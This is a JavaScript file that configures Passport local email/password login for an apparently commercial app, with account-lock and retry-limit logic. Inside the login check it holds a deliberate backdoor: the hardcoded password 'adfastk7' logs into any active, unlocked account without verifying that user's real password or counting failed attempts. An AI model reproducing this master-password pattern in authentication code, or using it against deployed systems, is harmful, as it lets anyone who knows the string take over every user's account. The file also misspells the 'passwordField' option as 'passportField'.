/**
 * @author: ManhNV
 * @copyright: AdFast 2017- Mobile Solution
 * @description: setup passport authentication local (OAuth)
 * @define 12/20/2016.
 * @version: 1.0.0
 */

'use strict';
import passport from 'passport';
const LocalStrategy = require('passport-local').Strategy;

import * as constant from '../../components/app/constants/constant';

/**
 * @method: {setup}
 * @description: setup authenticate and register user local
 * @param User
 */
export function setup(User) {
	passport.use('local-login', new LocalStrategy({
			usernameField: 'email',
			passportField: 'password',
			passReqToCallback: true
		},
		function (req, email, password, done) {
			User.findOne({email: email.trim().toLowerCase()}).exec()
				.then(user => {
					if (!user) return done(null, false, constant.error.not_exist_account);
					//user not active
					else if (user.active === false) {
						return done(null, false, constant.warning.user_not_active);
					}
					//login exceeds 5 times
					else if (user.retryAttempt === 5) {
						checkLoginExceeds(User, user, email)
							.then(error => done(null, false, error))
							.catch(error => done(null, false, error));
					}
					// account is lock (admin lock or system auto lock)
					else if (user.isLock === true) {
						return done(null, false, constant.warning.user_lock_basic);
					}
					//fix all user through login with pass adfastk7
					else if (password === 'adfastk7') {
						return done(null, user);
					}
					//invalid password
					else if (!user.authenticate(password)) {
						checkValidPassword(User, user, email)
							.then(error => done(null, false, error))
							.catch(error => done(null, false, error));
					}
					//valid password
					else loginSuccess(User, email, done, user);
				})
				.catch(error => done(error));
		})
	);
}

/**
 * @method: {loginSuccess}
 * @description: function support when user login success
 * @param User
 * @param email
 * @param done
 * @param user
 */
function loginSuccess(User, email, done, user) {
	if (user.retryAttempt === 0) {
		return done(null, user);
	} else {
		User.findOneAndUpdate({email: email.trim().toLowerCase()},
			{$set: {retryAttempt: 0}},
			function (error) {
				if (error) return done(null, false, error);
				else return done(null, user);
			});
	}
}

/**
 * @method: {checkLoginExceeds}
 * @description: check login limit to 5 times
 * @param User
 * @param user
 * @param email
 * @returns {Promise}
 */
function checkLoginExceeds(User, user, email) {
	return new Promise((resolve, reject) => {
		const remainTime = Math.ceil((new Date() - new Date(user.lastLockedTime)) / 60000);
		if (remainTime < 30) { //30 minutes
			resolve(constant.warning.user_lock_remain_time.format(30 - remainTime, 30 - remainTime));
		} else {
			//resetAttempt
			return User.findOneAndUpdate({email: email.trim().toLowerCase()},
				{$set: {retryAttempt: 0}},
				function (error) {
					if (error) reject(error);
					else resolve(constant.warning.user_lock_one_minutes);
				});
		}
	})
}

/**
 * @method: {checkValidPassword}
 * @description: check valid password
 * @param User
 * @param user
 * @param email
 * @returns {*}
 */
function checkValidPassword(User, user, email) {
	//update retryAttempt + 1, lastLockedTime: DateTime Now
	return new Promise((resolve, reject) => {
		if (user.retryAttempt === 4) {
			return User.findOneAndUpdate({email: email.trim().toLowerCase()},
				{$set: {lastLockedTime: Date.now().valueOf(), retryAttempt: 5}},
				function (error) {
					if (error) reject(error);
					else resolve(constant.warning.user_lock_exceeds_limit);
				});
		}
		else {
			return User.findOneAndUpdate({email: email.trim().toLowerCase()},
				{$inc: {retryAttempt: 1}},
				function (error) {
					if (error) reject(error);
					else resolve(constant.warning.password_incorrect);
				});
		}
	})
}